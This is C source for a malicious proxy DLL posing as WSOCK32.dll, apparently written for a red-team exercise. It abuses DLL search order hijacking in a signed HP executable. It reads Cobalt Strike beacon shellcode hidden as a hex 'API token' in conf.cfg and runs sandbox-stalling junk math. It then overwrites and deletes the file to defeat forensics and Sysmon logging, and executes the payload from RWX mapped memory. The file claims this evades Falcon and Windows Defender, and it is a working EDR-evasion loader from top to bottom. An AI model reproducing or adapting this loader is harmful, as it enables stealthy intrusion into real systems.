/*
   Author: Borja Merino
   Version: 0.1
   Exercise: XXXX
   Description:
   Taking advantage of a legitimate binary vulnerable to "DLL Search Order Hijacking" (discfcsn.exe, signed by HP)
   a harmful DLL (WSOCK32.dll) is loaded. The DLL then read and run a shellcode (Cobalt Strike HTTP beacon) from
   the "conf.cfg" file (kinda PlugX's style). "In theory" the Falcon agent only uploads binaries to its cloud,
   for this reason I read the payload from a text file (HEX-string form) disguised as a kind of API token (for some
   naive...). Furthermore, telemetry does not generate events for text files creation. Before reserving memory and
   executing the payload it runs some "junk code" for a while (certain mathematical operations to calculate
   decimals) to try to distract the sandbox. After executing the payload, "conf.cfg" is overwritten with
   random characters and removed to make forensics harder. At this time the DLL is harmless for both Falcon and
   Windows Defender.
*/

#include "pch.h"
#include <math.h>
#include <stdlib.h> 
#include <conio.h>
#include <stdio.h>
#include <windows.h>
//#include "syscalls.h" //SysWhispers

//Changeme
#define PSIZE 2500
#define FSIZE 1000
#define TSIZE 10

char line[FSIZE];
char varname[TSIZE];
char varvalue[FSIZE];
const char* pos = varvalue;
unsigned char payload[PSIZE];
static const char conf[] = "conf.cfg";

//Useful: https://codereview.stackexchange.com/questions/29198/random-string-generator-in-c
static char* rand_string(char* str, size_t size)
{
	const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJK...";
	if (size) {
		--size;
		for (size_t n = 0; n < size; n++) {
			int key = rand() % (int)(sizeof charset - 1);
			str[n] = charset[key];
		}
		str[size] = '\0';
	}
	return str;
}

//Change-me for bypassinng Event ID 23 (FileDelete) from Sysmon
void overwrite_file()
{
	FILE* ftoken;
	if ((fopen_s(&ftoken, conf, "w")) == 0) {
		char* s = (char*)malloc(FSIZE + 1);
		if (s) {
			fputs(rand_string(s, FSIZE), ftoken);
		}
		fclose(ftoken);
		DeleteFileA(conf);
	}
}

void error()
{
	MessageBox(0, L"Testing", L"ERROR", 0);
	exit(1);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void __stdcall bind(void) {}
void __stdcall htonl(void) {}
void __stdcall htons(void) {}
void __stdcall sendto(void) {}
void __stdcall socket(void) {}

double c(int num1) { return (16 / (num1 * pow(5.0, num1 * 1.0))); }
double c1(int num1) { return (4 / (num1 * pow(249.0, num1 * 1.0))); }

void stale()
{
	// Stale code. Play with the "limit" var to look for a delay you feel happy with 
	double limit = 10000;
	int j = 0;
	double ans1 = 0.0;
	double ans2 = 0.0;
	int flag = 1;

	for (j = 1; j <= limit; j += 1) {
		if (flag == 1) {
			ans1 += c(j);
			ans2 += c1(j);
			flag = 0;
		}
		else {
			ans1 -= c(j);
			ans2 -= c1(j);
			flag = 1;
		}
	}
	printf("%f", ans1);
}

void __stdcall WSAStartup(void)
{
	stale();
	char i;

	FILE* ftoken;
	if ((fopen_s(&ftoken, conf, "r")) != 0) {
		error();
	}

	//Get Token-Payload from file 
	if (fgets(line, sizeof line, ftoken) == NULL)
		error();

	if (sscanf_s(line, "%[^\n=]=%[^\n]", varname, sizeof varname, varvalue, sizeof varvalue) != 2)
		error();

	//Hex string to bin
	for (size_t count = 0; count < sizeof payload / sizeof * payload; count++) {
		sscanf(pos, "%2hhx", &payload[count]);
		pos += 2;
	}

	fclose(ftoken);
	overwrite_file();

	//Allocation + Execution (no error checks ¯\_(ツ)_/¯)
	HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(payload), NULL);
	LPVOID lpMapAddress = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, sizeof(payload));
	memcpy((PVOID)lpMapAddress, payload, sizeof(payload));

	__asm
	{
		mov eax, lpMapAddress
		push eax;
		ret
	}
}